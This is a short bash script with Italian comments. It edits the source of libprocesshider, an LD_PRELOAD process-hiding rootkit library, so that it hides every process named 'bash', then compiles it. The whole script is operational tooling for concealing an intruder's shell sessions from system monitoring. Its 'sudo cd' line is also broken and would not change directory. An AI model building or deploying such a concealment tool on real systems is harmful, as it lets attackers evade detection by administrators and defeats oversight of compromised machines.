#!/bin/bash

sudo cd /tmp/libprocesshider-master

# Nome del file da modificare
SOURCE_FILE="processhider.c"

# Nome del processo da nascondere (quello nuovo)
NEW_PROCESS_NAME="bash"

# Modifica del file sorgente
# Qui sostituisco solo la prima stringa trovata tra virgolette con "bash"
sed -i '0,/"[^"]*"/s//"bash"/' $SOURCE_FILE

# Verifico che la modifica sia stata eseguita con successo
if grep -q "\"$NEW_PROCESS_NAME\"" $SOURCE_FILE; then
    echo "Modifica riuscita: Il processo nascosto è ora \"$NEW_PROCESS_NAME\"."
else
    echo "Errore: La modifica non è riuscita."
    exit 1
fi

# Compilo
make

# Verifico che la compilazione sia avvenuta correttamente
if [ $? -eq 0 ]; then
    echo "Compilazione riuscita."
else
    echo "Errore durante la compilazione."
    exit 1
fi
